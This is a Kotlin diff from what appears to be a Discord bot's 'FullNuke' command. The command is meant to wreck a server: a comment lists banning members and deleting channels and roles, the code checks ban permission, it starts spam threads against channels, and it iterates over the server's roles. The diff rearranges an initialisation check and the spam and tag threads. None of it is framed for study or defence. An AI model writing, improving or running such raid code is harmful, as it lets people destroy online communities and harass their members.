@@ -14,9 +14,9 @@ class FullNuke : CommandListener() {
     override fun onEvent(event: MessageReceivedEvent) {
 
 //BAN,del channel,del role,
-
+        if (onInit(event)) return
         if (message.contentRaw.startsWith("!fullnuke")) {
-            if (onInit(event)) return
+
 
             if (guild.selfMember.hasPermission(Permission.BAN_MEMBERS))
             {
@@ -36,18 +36,18 @@ class FullNuke : CommandListener() {
                     val index = messageRaw.indexOf(" ")
                     val index2 = messageRaw.indexOf(" ", index + 1)
                     val index3 = messageRaw.indexOf(" ",index2+ 1)
-                    val tag = messageRaw.substring(index + 1, index2).equals("true")
+                    val tag = messageRaw.substring(index + 1, index2)
                     val content = messageRaw.substring(index2 + 1,index3)
                     val content2 = messageRaw.substring(index3+1)
 
-                    val channelThread = Thread(SpamChannel.ChannelThread(content))
+                    val channelThread = Thread(SpamChannel.ChannelThread(content,content2,tag))
                     channelThread.start()
-                    if (tag) {
-                        for (i in 0..3) {
-                            val tagThread = Thread(SpamChannel.TagThread(content2))
-                            tagThread.start()
-                        }
-                    }
+
+//                    for (i in 0..3) {
+//                        val tagThread = Thread(SpamChannel.TagThread(content2,tag))
+//                        tagThread.start()
+//                    }
+
 
                     for (role in guild.roles) {
                         try {
